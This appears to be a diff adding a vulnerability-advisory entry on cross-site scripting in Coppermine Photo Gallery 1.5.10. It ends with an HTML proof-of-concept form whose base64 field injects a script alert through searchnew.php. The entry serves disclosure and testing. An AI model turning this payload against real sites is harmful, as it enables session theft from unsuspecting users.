@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/45600/info
+ 
+Coppermine Photo Gallery is prone to multiple cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+ 
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+ 
+Coppermine Photo Gallery 1.5.10 is vulnerable; other versions may also be affected. 
+
+<html><body><center> <form action="http://localhost/cpg.1.5.10/searchnew.php" method="post"> <input type="hidden" name="insert" value="1"> <input type="hidden" name="pics[]" value="222"> <input type="hidden" name="picfile_222" value="PGJvZHkgb25sb2FkPWFsZXJ0KDEyMyk7Pg"> <input type="submit" value="Test!"> </form> </center></body></html> 
